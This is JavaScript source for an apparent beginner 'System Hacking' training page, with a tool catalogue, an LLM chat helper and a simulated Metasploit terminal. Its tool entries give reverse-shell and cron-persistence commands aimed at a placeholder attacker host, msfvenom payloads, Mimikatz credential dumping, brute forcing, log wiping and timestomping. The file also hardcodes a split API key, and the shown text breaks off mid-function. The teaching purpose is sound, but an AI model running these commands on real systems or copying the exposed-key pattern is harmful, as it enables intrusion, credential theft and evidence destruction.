const keyP1 = "gsk_OCCHNxtXBVzq8";
        const keyP2 = "GdGCu99WGdyb3FY";
        const keyP3 = "sqdvAWM3jBcoxcwJaUrC8EGa";
        const apiKey = keyP1 + keyP2 + keyP3;

        const MODULE_KEY       = 'module_systemhacking_completed';
        const CUSTOM_TOOLS_KEY = 'sys_custom_tools';
        const EDITED_TOOLS_KEY = 'sys_edited_default_tools';
        const DELETED_TOOLS_KEY= 'sys_deleted_default_indices';
        const CUSTOM_CATS_KEY  = 'sys_custom_categories';

        const defaultTools = [
            // ── Privilege Escalation ────────────────────────────────
            {
                name: "1. LinPEAS",
                link: "https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS",
                category: "PrivEsc",
                brief: "An automated Linux privilege escalation enumeration script. Once you have a low-privilege shell on a Linux box, LinPEAS scans the entire system for misconfigurations that could let you become root — weak file permissions, sudo misconfigurations, cron jobs, SUID binaries, exposed credentials in files, and kernel exploits. It highlights findings in color: red/yellow means likely exploitable.",
                use: "Upload and run: <code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code><br>Or transfer the script and run: <code>chmod +x linpeas.sh && ./linpeas.sh</code><br>Save output to a file for review: <code>./linpeas.sh > output.txt</code>",
                useful: "After landing a low-privilege shell, manually checking 50+ possible privesc vectors takes hours. LinPEAS automates that entire enumeration in 2-3 minutes and color-codes the most promising leads, dramatically speeding up the path to root."
            },
            {
                name: "2. WinPEAS",
                link: "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS",
                category: "PrivEsc",
                brief: "The Windows counterpart to LinPEAS. It enumerates a compromised Windows machine for privilege escalation vectors: unquoted service paths, weak registry permissions, stored credentials, scheduled tasks running as SYSTEM, and AlwaysInstallElevated misconfigurations — all the classic Windows privesc techniques in one automated scan.",
                use: "Transfer winPEAS.exe to target, then run: <code>.\\winPEASx64.exe</code><br>For a quieter scan focused only on the most likely wins: <code>.\\winPEASx64.exe quiet cmd</code><br>Output is color-coded the same way as LinPEAS.",
                useful: "Windows privilege escalation has dozens of distinct attack categories. WinPEAS checks all of them automatically, which is essential since manually checking service permissions and registry ACLs one by one is impractical during a live engagement."
            },
            {
                name: "3. GTFOBins",
                link: "https://gtfobins.github.io",
                category: "PrivEsc",
                brief: "Not a tool you run — it's a curated reference website listing Unix binaries that can be abused to bypass local security restrictions. If a sysadmin gives you sudo access to run just ONE seemingly harmless binary like 'find' or 'vim', GTFOBins shows you the exact one-liner to escalate that into a full root shell.",
                use: "Check your sudo permissions: <code>sudo -l</code><br>Take any binary listed and search it on gtfobins.github.io. Example: if you have sudo access to 'find', the site shows: <code>sudo find . -exec /bin/sh \\; -quit</code>",
                useful: "This is the fastest privesc method when it applies — instant root from a single misconfigured sudoers entry. Every penetration tester checks 'sudo -l' first, then cross-references every listed binary against GTFOBins before trying anything more complex."
            },
            {
                name: "4. PowerUp / PowerSploit",
                link: "https://github.com/PowerShellMafia/PowerSploit",
                category: "PrivEsc",
                brief: "A PowerShell-based post-exploitation framework. Its PrivEsc module (PowerUp) specifically audits a Windows machine for privilege escalation opportunities, similar to WinPEAS but more script-friendly and integratable into larger PowerShell-based attack chains.",
                use: "Import the module: <code>Import-Module .\\PowerUp.ps1</code><br>Run full audit: <code>Invoke-AllChecks</code><br>It outputs a structured list of abusable services, DLL hijacking opportunities, and registry misconfigurations.",
                useful: "When operating in a PowerShell-heavy Windows environment (common in enterprise AD networks), PowerUp integrates naturally with other PowerShell attack tooling, avoiding the need to drop a separate .exe binary which is more likely to trigger antivirus."
            },
            // ── Password Attacks ────────────────────────────────────
            {
                name: "5. Hashcat",
                link: "https://hashcat.net/hashcat/",
                category: "PasswordAttack",
                brief: "The world's fastest password cracking tool, built to use your GPU's massive parallel processing power instead of just the CPU. It takes a stolen password hash (from a database breach, a Windows SAM file, or a captured handshake) and tries to recover the original plaintext password using dictionary attacks, brute force, or rule-based mutations.",
                use: "Dictionary attack on MD5 hashes: <code>hashcat -m 0 -a 0 hashes.txt rockyou.txt</code><br>Crack NTLM hashes (Windows): <code>hashcat -m 1000 -a 0 hashes.txt rockyou.txt</code><br>Apply mutation rules: <code>hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule</code>",
                useful: "After gaining access and dumping password hashes (via Mimikatz or a database breach), the hashes are useless until cracked into plaintext. Hashcat with a good GPU can test billions of password guesses per second — turning a stolen hash into a usable login in minutes for weak passwords."
            },
            {
                name: "6. John the Ripper",
                link: "https://www.openwall.com/john/",
                category: "PasswordAttack",
                brief: "The classic, CPU-based password cracker. While Hashcat dominates with GPU power, John the Ripper is more flexible out-of-the-box for cracking unusual hash formats (like password-protected ZIP files, PDF files, or SSH private keys) and auto-detects hash types without you having to specify the mode manually.",
                use: "Crack with rockyou wordlist: <code>john --wordlist=rockyou.txt hashes.txt</code><br>Show cracked results: <code>john --show hashes.txt</code><br>Crack a password-protected zip: <code>zip2john secured.zip > hash.txt && john hash.txt</code>",
                useful: "When you find a protected file (zip, PDF, SSH key) instead of a raw hash database, John's specialized format converters (zip2john, pdf2john, ssh2john) make it the go-to tool for cracking file-based password protection, not just database hash dumps."
            },
            {
                name: "7. Mimikatz",
                link: "https://github.com/gentilkiwi/mimikatz",
                category: "PasswordAttack",
                brief: "The most famous Windows credential extraction tool. Once you have administrator access on a Windows machine, Mimikatz pulls plaintext passwords, NTLM hashes, and Kerberos tickets directly out of the machine's memory (LSASS process) — credentials that were typed in by users who logged in, even if they've since logged out.",
                use: "Launch as admin: <code>mimikatz.exe</code><br>Enable debug privileges: <code>privilege::debug</code><br>Dump all credentials from memory: <code>sekurlsa::logonpasswords</code><br>Pass-the-hash attack: <code>sekurlsa::pth /user:admin /domain:corp /ntlm:HASH</code>",
                useful: "This is THE tool for Windows Active Directory lateral movement. One admin-level compromise plus Mimikatz often reveals domain admin credentials cached in memory, leading to full domain takeover within minutes. It's why Microsoft keeps patching LSASS protections — and why attackers keep finding ways around them."
            },
            {
                name: "8. Hydra",
                link: "https://github.com/vanhauser-thc/thc-hydra",
                category: "PasswordAttack",
                brief: "An online password brute-forcing tool that attacks live login services directly — SSH, FTP, RDP, HTTP login forms, and 50+ other protocols. Unlike Hashcat/John which crack offline hash files, Hydra sends actual login attempts over the network against a real service.",
                use: "SSH brute force: <code>hydra -l admin -P rockyou.txt ssh://192.168.1.10</code><br>HTTP POST form login: <code>hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"</code><br>FTP: <code>hydra -L users.txt -P passwords.txt ftp://192.168.1.10</code>",
                useful: "When you have a username but no password hash to crack offline, Hydra tests credentials directly against the live service. Critical for testing weak SSH/RDP exposure or login forms during a pentest, but extremely loud — most IDS/IPS systems flag rapid failed login attempts."
            },
            // ── Persistence & Backdoors ──────────────────────────────
            {
                name: "9. Metasploit Meterpreter",
                link: "https://www.metasploit.com",
                category: "Persistence",
                brief: "An advanced payload that runs entirely in memory after exploitation, giving you a full interactive shell with built-in post-exploitation commands: file transfer, screenshot capture, keylogging, pivoting to other network segments, and persistence installation — all without writing extra files to disk where antivirus might catch them.",
                use: "Generate a payload: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe</code><br>Set up listener in msfconsole: <code>use exploit/multi/handler</code> then <code>set PAYLOAD windows/meterpreter/reverse_tcp</code> then <code>run</code><br>Once connected, install persistence: <code>run persistence -X -i 10 -p 4444 -r attacker_ip</code>",
                useful: "Meterpreter's in-memory execution makes it far stealthier than dropping a traditional backdoor file. Built-in modules for pivoting let you use one compromised machine as a launching point to attack other machines deeper in the network that aren't directly reachable."
            },
            {
                name: "10. Netcat (Reverse Shells)",
                link: "https://nmap.org/ncat/",
                category: "Persistence",
                brief: "The simplest possible backdoor mechanism. A reverse shell makes the TARGET machine connect back out to YOUR machine, bypassing inbound firewall rules (most firewalls block incoming connections but allow outgoing ones). Netcat is pre-installed on most Linux systems, making it the lowest-effort persistence option.",
                use: "On attacker machine, start listener: <code>nc -lvp 4444</code><br>On target machine, connect back: <code>nc attacker_ip 4444 -e /bin/bash</code><br>If -e isn't supported, use a named pipe: <code>mkfifo /tmp/f; nc attacker_ip 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f</code>",
                useful: "When a target firewall blocks inbound connections but allows outbound traffic (the common case), a reverse shell is the only way in. It's the foundational concept behind every more advanced backdoor — Meterpreter, web shells, and C2 frameworks all build on this same reverse-connection idea."
            },
            {
                name: "11. Cron Job / Scheduled Task Persistence",
                link: "https://www.gnu.org/software/cron/",
                category: "Persistence",
                brief: "A persistence technique abusing the operating system's built-in task scheduler. By adding a malicious entry to crontab (Linux) or Task Scheduler (Windows), the system automatically re-executes your backdoor at set intervals — even after a reboot — without needing any special tools, just access to the scheduler.",
                use: "Linux — add a cron job that reconnects every 5 minutes: <code>(crontab -l; echo \"*/5 * * * * nc attacker_ip 4444 -e /bin/bash\") | crontab -</code><br>Windows — create a scheduled task: <code>schtasks /create /sc minute /mo 5 /tn \"Update\" /tr \"C:\\backdoor.exe\"</code>",
                useful: "This is one of the hardest persistence techniques to detect because it uses completely legitimate, expected system functionality. Defenders need to specifically audit crontab entries and scheduled tasks against a known-good baseline to catch it — it won't trigger most malware signatures."
            },
            // ── Covering Tracks ──────────────────────────────────────
            {
                name: "12. Log Manipulation (Linux)",
                link: "https://man7.org/linux/man-pages/man1/last.1.html",
                category: "CoverTracks",
                brief: "After gaining access, every action you take gets logged — login attempts in /var/log/auth.log, command history in .bash_history, login records visible via the 'last' command. Covering tracks means selectively editing or clearing these logs to remove evidence of your access, without deleting the entire log file (which itself is suspicious and easily noticed).",
                use: "Clear your command history: <code>history -c && history -w</code><br>Remove specific log entries (requires care to avoid corrupting the file): edit <code>/var/log/auth.log</code> directly with a text editor, removing only lines matching your IP/timestamp<br>Check who can see your login: <code>last</code> and <code>w</code>",
                useful: "Crucial concept for understanding both attacker tradecraft and defensive log monitoring. Security teams set up centralized, write-once logging (SIEM systems) specifically because local logs can be tampered with by anyone who gets root — local-only logging is not a trustworthy audit trail."
            },
            {
                name: "13. Timestomp",
                link: "https://github.com/rapid7/metasploit-framework",
                category: "CoverTracks",
                brief: "A Meterpreter module (and standalone forensic anti-tool) that modifies a file's MAC timestamps — Modified, Accessed, Created. Forensic investigators rely heavily on file timestamps to reconstruct a timeline of attacker activity. Timestomp lets you make a malicious file appear as old as the operating system itself, blending it in with legitimate system files.",
                use: "Within a Meterpreter session: <code>timestomp C:\\malware.exe -v</code> (view current timestamps)<br>Set to match another file: <code>timestomp C:\\malware.exe -f C:\\Windows\\System32\\kernel32.dll</code><br>Set all timestamps to a specific date: <code>timestomp C:\\malware.exe -z \"01/01/2020 00:00:00\"</code>",
                useful: "Digital forensics investigators build timelines from file metadata. Understanding timestomping is essential for both red teamers (evading forensic timeline analysis) and blue teamers/forensic analysts (knowing that timestamps alone are NOT reliable evidence and must be cross-validated against other artifacts like file system journals)."
            },
            {
                name: "14. CCleaner / BleachBit",
                link: "https://www.bleachbit.org",
                category: "CoverTracks",
                brief: "General-purpose system cleaning tools (legitimate software, dual-use for anti-forensics) that wipe temporary files, browser history, recently-used document lists, and other system artifacts that could reveal what actions were performed on a machine. Far less surgical than manual log editing, but effective for broad cleanup.",
                use: "BleachBit CLI on Linux: <code>bleachbit --clean system.cache system.tmp system.recent_documents</code><br>List all available cleaners: <code>bleachbit --list</code><br>GUI version lets you check boxes for specific categories (browser cache, system logs, recent files) before cleaning.",
                useful: "Used as a final broad-sweep cleanup step after more targeted log editing. Important to understand from a defensive view too — a machine with NO browser history, NO recent files, and pristine temp folders is itself a major red flag for forensic investigators, since real usage always leaves some trace."
            },
            {
                name: "15. Auditd / Sysmon Awareness",
                link: "https://github.com/SwiftOnSecurity/sysmon-config",
                category: "CoverTracks",
                brief: "Not an attacker tool — this is what defenders use to make covering tracks much harder. Sysmon (Windows) and auditd (Linux) log detailed system activity to a protected location, often forwarded immediately to a remote SIEM server in real time, so an attacker can't simply delete local logs to erase evidence — the centralized copy already exists elsewhere.",
                use: "Check if Sysmon is installed and what it's logging on Windows: <code>Get-Service Sysmon*</code><br>View auditd rules on Linux: <code>auditctl -l</code><br>Check if logs are being forwarded: look for syslog/rsyslog forwarding rules in <code>/etc/rsyslog.conf</code>",
                useful: "Understanding this from the attacker side changes your approach entirely — if Sysmon/auditd with remote forwarding is detected, local log deletion is pointless theater. The real goal becomes avoiding detection in the first place, not erasing evidence after the fact. This is the core lesson that ties Module 05 back to real-world defensive thinking."
            }
        ];

        let tools = [];
        let editingToolIndex = null;

        function init() {
            const list = document.getElementById('toolList');
            list.innerHTML = '';

            const categories = { "PrivEsc": [], "PasswordAttack": [], "Persistence": [], "CoverTracks": [] };
            const catDisplayNames = {
                "PrivEsc": "⬆️ Privilege Escalation",
                "PasswordAttack": "🔑 Password Attacks",
                "Persistence": "🔒 Persistence & Backdoors",
                "CoverTracks": "🧹 Covering Tracks"
            };

            try {
                const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
                for (const [k, v] of Object.entries(customCats)) { categories[k] = []; catDisplayNames[k] = v; }
            } catch(e) { console.error(e); }

            tools.forEach((tool, index) => {
                const cat = tool.category || "PrivEsc";
                if (categories[cat]) categories[cat].push({ tool, index });
                else categories["PrivEsc"].push({ tool, index });
            });

            for (const [catName, catTools] of Object.entries(categories)) {
                if (catTools.length === 0) continue;
                const h = document.createElement('div');
                h.className = 'category-header';
                h.innerText = catDisplayNames[catName];
                list.appendChild(h);
                catTools.forEach(({ tool, index }) => {
                    const div = document.createElement('div');
                    div.className = 'tool-item';
                    div.innerText = tool.name.split('.')[1]?.trim() || tool.name;
                    div.onclick = () => showDetails(index, div);
                    list.appendChild(div);
                });
            }

            if (apiKey.includes("YOUR_MIDDLE_PART")) {
                document.getElementById('statusDot').classList.remove('online');
                addBotMessage("⚠️ API key not configured. Update keyP1/keyP2/keyP3 in the HTML.");
            }
        }

        function reloadAllTools() {
            tools = defaultTools.map((t, idx) => ({ ...t, originalIndex: idx }));
            try {
                const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
                tools = tools.filter(t => !del.includes(t.originalIndex));
            } catch(e) {}
            try {
                const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
                tools.forEach(t => { if (edited[t.originalIndex]) Object.assign(t, edited[t.originalIndex]); });
            } catch(e) {}
            loadCustomTools();
            init();
        }

        function showDetails(index, element) {
            document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
            element.classList.add('active');
            const tool = tools[index];
            const catClass = `badge-${tool.category.toLowerCase()}`;
            const displayCatName = tool.category.replace(/_/g, ' ');
            document.getElementById('detailsPanel').innerHTML = `
                <div class="card">
                    <h1 style="display:flex;justify-content:space-between;align-items:center;width:100%;">
                        <span>${tool.name.split('.')[1]?.trim() || tool.name}<span class="badge ${catClass}">${displayCatName}</span></span>
                        <div style="display:flex;gap:8px;align-items:center;">
                            <button class="btn btn-edit-tool" onclick="openEditToolModal(${index})" style="font-size:0.8rem;padding:6px 12px;">✏️ Edit</button>
                            <button class="btn btn-delete-tool" onclick="confirmDeleteTool(${index})" style="font-size:0.8rem;padding:6px 12px;">🗑️ Delete</button>
                            <a href="${tool.link}" target="_blank" style="font-size:0.8rem;padding:6px 12px;">Launch ↗</a>
                        </div>
                    </h1>
                    <div class="section-label">Simply Explained (What is it?)</div>
                    <div class="section-content">${tool.brief}</div>
                    <div class="section-label">How to actually use it</div>
                    <div class="section-content">${tool.use}</div>
                    <div class="section-label">Why Hackers care about this</div>
                    <div class="section-content">${tool.useful}</div>
                </div>`;
            if (window.innerWidth <= 768) switchMobileTab('details');
        }

        function handleEnter(e) { if (e.key === 'Enter') sendMessage(); }

        async function sendMessage() {
            const inputEl = document.getElementById('chatInput');
            const msg = inputEl.value.trim();
            if (!msg) return;
            addUserMessage(msg);
            inputEl.value = '';

            if (!apiKey || apiKey.includes("YOUR_MIDDLE_PART")) {
                setTimeout(() => addBotMessage("❌ Missing Groq API Key. Edit keyP1/keyP2/keyP3."), 500);
                return;
            }

            const toolsContext = tools.map(t => `${t.name.split('.')[1]?.trim() || t.name}: ${t.brief}`).join(" | ");
            const systemPrompt = `You are a focused cybersecurity assistant specialising in MODULE 05: System Hacking. Your primary topics are: privilege escalation (Windows and Linux), password cracking and hash attacks, persistence mechanisms and backdoors, session hijacking, post-exploitation, and tools like LinPEAS, WinPEAS, Mimikatz, Hashcat, John the Ripper, and Meterpreter.

Answer questions on these topics directly and in beginner-friendly language using analogies where helpful. You can answer general cybersecurity questions outside this scope too — but briefly connect them back to system hacking concepts where relevant.

Key distinction to always explain when relevant: Vulnerability Analysis (Module 04) identifies WHICH flaws are exploitable. System Hacking (Module 05) is what happens AFTER successful exploitation — gaining a foothold, escalating from a low-privilege user to admin/root, harvesting credentials, and maintaining access without being detected.

Always be clear that these techniques are for authorized penetration testing, CTFs, and personal lab environments only — never imply real-world unauthorized use.

When writing commands, ALWAYS use markdown fenced code blocks (\`\`\`bash) or inline backticks.

Tool context for this module: ${toolsContext}.

Be direct, no fluff, never vague.`;

            const loadingId = "load-" + Date.now();
            try {
                showTypingIndicator(loadingId);
                const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${apiKey}` },
                    body: JSON.stringify({
                        model: "openai/gpt-oss-20b",
                        messages: [{ role: "system", content: systemPrompt }, { role: "user", content: msg }]
                    })
                });
                const data = await response.json();
                document.getElementById(loadingId)?.remove();
                if (data.error) addBotMessage(`Groq API Error: ${data.error.message}`);
                else addBotMessage(formatMarkdown(data.choices[0].message.content));
            } catch(error) {
                document.getElementById(loadingId)?.remove();
                addBotMessage(`Network Error: Failed to reach Groq API.`);
            }
        }

        function formatMarkdown(text) {
            let html = text.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
            html = html.replace(/```(\w*)\n([\s\S]*?)```/g, (m, lang, code) => `<pre><code class="language-${lang}">${code.trim()}</code></pre>`);
            html = html.replace(/`([^`\n]+)`/g, '<code>$1</code>');
            html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
            let lines = html.split('\n'); let inList = false;
            for (let i = 0; i < lines.length; i++) {
                const line = lines[i].trim();
                if (line.startsWith('* ') || line.startsWith('- ')) {
                    const content = line.substring(2);
                    lines[i] = inList ? `<li>${content}</li>` : `<ul><li>${content}</li>`;
                    inList = true;
                } else { if (inList) { lines[i] = '</ul>' + lines[i]; inList = false; } }
            }
            if (inList) lines[lines.length - 1] += '</ul>';
            html = lines.join('\n').replace(/\n/g, '<br>');
            html = html.replace(/<\/pre><br>/g,'</pre>').replace(/<\/ul><br>/g,'</ul>').replace(/<\/li><br>/g,'</li>').replace(/<ul><br>/g,'<ul>');
            return html;
        }

        function showTypingIndicator(id) {
            const h = document.getElementById('chatHistory');
            h.innerHTML += `<div class="msg bot typing-indicator" id="${id}"><span></span><span></span><span></span></div>`;
            h.scrollTop = h.scrollHeight;
        }
        function addUserMessage(text) { const h = document.getElementById('chatHistory'); h.innerHTML += `<div class="msg user">${text}</div>`; h.scrollTop = h.scrollHeight; }
        function addBotMessage(text) { const h = document.getElementById('chatHistory'); h.innerHTML += `<div class="msg bot">${text}</div>`; h.scrollTop = h.scrollHeight; }

        function switchMobileTab(tabId) {
            document.querySelectorAll('.nav-tab').forEach(btn => btn.classList.toggle('active', btn.getAttribute('onclick').includes(tabId)));
            document.body.className = document.body.className.replace(/\btab-\w+\b/g,'').trim();
            document.body.classList.add('tab-' + tabId);
        }

        function updateCompletionButton() {
            const btn = document.getElementById('completeModuleBtn');
            if (!btn) return;
            const done = localStorage.getItem(MODULE_KEY) === 'true';
            btn.innerText = done ? "✓ Module Completed" : "Mark Module Completed";
            btn.classList.toggle('completed', done);
        }
        function toggleModuleCompletion() {
            localStorage.setItem(MODULE_KEY, !(localStorage.getItem(MODULE_KEY) === 'true'));
            updateCompletionButton();
        }

        function openAddToolModal() {
            editingToolIndex = null;
            document.querySelector('#addToolModal h3').innerText = "Add Custom Tool";
            document.querySelector('#addToolForm button[type="submit"]').innerText = "Add Tool";
            document.getElementById('addToolForm').reset();
            cancelNewCategory(); loadCustomCategories();
            const modal = document.getElementById('addToolModal');
            modal.style.display = 'flex'; modal.offsetHeight; modal.classList.add('active');
            document.getElementById('toolName').focus();
        }

        function openEditToolModal(index) {
            editingToolIndex = index;
            const tool = tools[index];
            document.querySelector('#addToolModal h3').innerText = "Edit Tool Info";
            document.querySelector('#addToolForm button[type="submit"]').innerText = "Save Changes";
            document.getElementById('addToolForm').reset();
            cancelNewCategory(); loadCustomCategories();
            document.getElementById('toolName').value = tool.name.includes('.') ? tool.name.split('.')[1].trim() : tool.name.trim();
            document.getElementById('toolLink').value = tool.link;
            document.getElementById('toolCategory').value = tool.category;
            document.getElementById('toolBrief').value = tool.brief;
            document.getElementById('toolUse').value = tool.use;
            document.getElementById('toolUseful').value = tool.useful;
            const modal = document.getElementById('addToolModal');
            modal.style.display = 'flex'; modal.offsetHeight; modal.classList.add('active');
        }

        function closeAddToolModal() {
            const modal = document.getElementById('addToolModal');
            modal.classList.remove('active');
            setTimeout(() => { modal.style.display = 'none'; document.getElementById('addToolForm').reset(); }, 300);
        }

        function loadCustomTools() {
            try {
                const stored = localStorage.getItem(CUSTOM_TOOLS_KEY);
                if (stored) {
                    JSON.parse(stored).forEach((tool, idx) => {
                        const match = tool.name.match(/^\d+\.\s*(.*)$/);
                        tool.name = `${tools.length + 1}. ${match ? match[1] : tool.name}`;
                        tool.originalIndex = null; tool.customIndex = idx;
                        tools.push(tool);
                    });
                }
            } catch(e) { console.error(e); }
        }

        function submitNewTool(e) {
            e.preventDefault();
            const vals = { name: document.getElementById('toolName').value.trim(), link: document.getElementById('toolLink').value.trim(), category: document.getElementById('toolCategory').value, brief: document.getElementById('toolBrief').value.trim(), use: document.getElementById('toolUse').value.trim(), useful: document.getElementById('toolUseful').value.trim() };

            if (editingToolIndex !== null) {
                const orig = tools[editingToolIndex];
                if (orig.originalIndex !== null) {
                    const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
                    edited[orig.originalIndex] = vals;
                    localStorage.setItem(EDITED_TOOLS_KEY, JSON.stringify(edited));
                } else {
                    const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
                    ct[orig.customIndex] = vals;
                    localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
                }
            } else {
                const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
                ct.push(vals);
                localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
            }

            closeAddToolModal(); reloadAllTools();
            setTimeout(() => {
                let foundIndex = 0, newToolEl = null;
                tools.forEach((t, idx) => { if ((t.name.includes('.') ? t.name.split('.')[1].trim() : t.name.trim()) === vals.name) foundIndex = idx; });
                document.querySelectorAll('.tool-item').forEach(el => { if (el.innerText === vals.name) newToolEl = el; });
                if (newToolEl) showDetails(foundIndex, newToolEl);
            }, 100);
        }

        function confirmDeleteTool(index) {
            const rawName = tools[index].name.includes('.') ? tools[index].name.split('.')[1].trim() : tools[index].name.trim();
            if (confirm(`Delete "${rawName}"?`)) deleteTool(index);
        }

        function deleteTool(index) {
            const tool = tools[index];
            if (tool.originalIndex !== null) {
                const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
                if (!del.includes(tool.originalIndex)) { del.push(tool.originalIndex); localStorage.setItem(DELETED_TOOLS_KEY, JSON.stringify(del)); }
            } else {
                const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
                ct.splice(tool.customIndex, 1);
                localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
            }
            reloadAllTools();
            document.getElementById('detailsPanel').innerHTML = `<div style="text-align:center;color:var(--text-muted);margin-top:20vh;"><h3>Select a tool from the menu to view beginner-friendly intelligence data.</h3></div>`;
        }

        function loadCustomCategories() {
            try {
                const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
                const sel = document.getElementById('toolCategory');
                sel.innerHTML = `
                    <option value="PrivEsc">⬆️ Privilege Escalation</option>
                    <option value="PasswordAttack">🔑 Password Attacks</option>
                    <option value="Persistence">🔒 Persistence & Backdoors</option>
                    <option value="CoverTracks">🧹 Covering Tracks</option>`;
                for (const [k, v] of Object.entries(customCats)) {
                    const opt = document.createElement('option');
                    opt.value = k; opt.innerText = v; sel.appendChild(opt);
                }
            } catch(e) {}
        }

        function showNewCategoryForm() { document.getElementById('newCategoryGroup').style.display = 'block'; document.getElementById('newCategoryName').focus(); }
        function cancelNewCategory() { document.getElementById('newCategoryGroup').style.display = 'none'; document.getElementById('newCategoryName').value = ''; document.getElementById('newCategoryIcon').value = ''; }
        function saveNewCategory() {
            const name = document.getElementById('newCategoryName').value.trim();
            const icon = document.getElementById('newCategoryIcon').value.trim() || "📁";
            if (!name) return;
            const key = name.replace(/\s+/g,'_');
            try {
                const cc = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
                cc[key] = `${icon} ${name}`; localStorage.setItem(CUSTOM_CATS_KEY, JSON.stringify(cc));
            } catch(e) {}
            loadCustomCategories(); document.getElementById('toolCategory').value = key; cancelNewCategory();
        }

        window.addEventListener('click', e => { if (e.target === document.getElementById('addToolModal')) closeAddToolModal(); });
        window.addEventListener('keydown', e => { if (e.key === 'Escape') closeAddToolModal(); });

        // Tab switching
        function switchPanelTab(tabId) {
            document.querySelectorAll('.chat-panel .tab-content').forEach(el => el.style.display = 'none');
            document.querySelectorAll('.chat-panel .panel-tab').forEach(btn => btn.classList.remove('active'));
            
            if (tabId === 'chat') {
                document.getElementById('chatTabContent').style.display = 'flex';
            } else if (tabId === 'terminal') {
                document.getElementById('terminalTabContent').style.display = 'flex';
                document.getElementById('terminalInput').focus();
            } else if (tabId === 'quiz') {
                document.getElementById('quizTabContent').style.display = 'flex';
            }
            
            // Set active button style
            const tabBtn = Array.from(document.querySelectorAll('.chat-panel .panel-tab')).find(btn => btn.innerText.toLowerCase().includes(tabId));
            if (tabBtn) tabBtn.classList.add('active');
        }

        // Terminal logic
        function handleTerminalEnter(event) {
            if (event.key === 'Enter') {
                const inputEl = document.getElementById('terminalInput');
                const cmd = inputEl.value.trim();
                if (!cmd) return;
                
                // Add to terminal output
                const outEl = document.getElementById('terminalOutput');
                outEl.innerHTML += `<div><span style="color: #34d399;">guest@cyberx:~$</span> ${cmd}</div>`;
                
                // Run mock command
                runMockTerminalCommand(cmd);
                
                inputEl.value = '';
                outEl.scrollTop = outEl.scrollHeight;
            }
        }

        function runMockTerminalCommand(cmd) {
            const outEl = document.getElementById('terminalOutput');
            const cleanCmd = cmd.toLowerCase().trim();
            const parts = cleanCmd.split(/\s+/);
            const baseCmd = parts[0];

            if (baseCmd === 'clear') {
                outEl.innerHTML = '';
                return;
            }

            if (baseCmd === 'help') {
                outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                    Available commands:<br>
                    - <span style="color: #fbbf24;">msfconsole</span>: Launch Metasploit Framework simulator<br>
                    - <span style="color: #fbbf24;">searchsploit [query]</span>: Search Exploit Database (e.g. searchsploit eternalblue)<br>
                    - <span style="color: #fbbf24;">hydra [args]</span>: Brute-force credentials (e.g. hydra -l admin -P pass.txt ssh://10.0.0.5)<br>
                    - <span style="color: #fbbf24;">hashcat [args]</span>: Password cracking simulation (e.g. hashcat -m 1000 ntlm.hash rockyou.txt)<br>
                    - <span style="color: #fbbf24;">clear</span>: Clear screen<br>
                    - <span style="color: #fbbf24;">help</span>: Show this menu
                </div>`;
                return;
            }

            if (baseCmd === 'msfconsole') {
                outEl.innerHTML += `<div style="color: #e5c07b; font-family: monospace; white-space: pre; margin: 10px 0;">
  =========================================
  iiiii  iiiii  iiiii  iiiii  iiiii  iiiii
  _____  _____  _____  _____  _____  _____
 |     ||     ||     ||     ||     ||     |
 | Metasploit Framework Simulator v6.0.0 |
 |_____||_____||_____||_____||_____||_____|
  iiiii  iiiii  iiiii  iiiii  iiiii  iiiii
  =========================================
                </div>
                <div style="color: #34d399;">[+] MSF Initialized! Default database connected.</div>
                <div style="color: #8b949e; margin-bottom: 5px;">Type 'use exploit/windows/smb/ms17_010_eternalblue' followed by 'run' to test.</div>`;
                return;
            }

            if (cleanCmd.startsWith('use exploit/') || cleanCmd === 'run' || cleanCmd === 'exploit') {
                outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                    [*] Exploit target: 10.0.0.5:445 (Windows 7)<br>
                    [*] Triggering EternalBlue exploit chain...<br>
                    [+] Target vulnerable! SMB execution succeeded.<br>
                    [*] Sending Meterpreter stage (175174 bytes) to 10.0.0.5<br>
                    <span style="color: #34d399; font-weight: bold;">[+] Meterpreter session 1 opened (10.0.0.2:4444 -> 10.0.0.5:49158)</span><br>
                    meterpreter > <span style="color: #f8fafc;">getsystem</span><br>
                    ...got system via Technique 1 (Named Pipe Impersonation).<br>
                    meterpreter > <span style="color: #f8fafc;">hashdump</span><br>
                    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                </div>`;
                return;
            }

            if (baseCmd === 'searchsploit') {
                const query = parts[1] || '';
                if (!query) {
                    outEl.innerHTML += `<div style="color: #ef4444;">Error: Query required. E.g., 'searchsploit eternalblue'</div>`;
                    return;
                }
                if (query.includes('eternal') || query.includes('ms17')) {
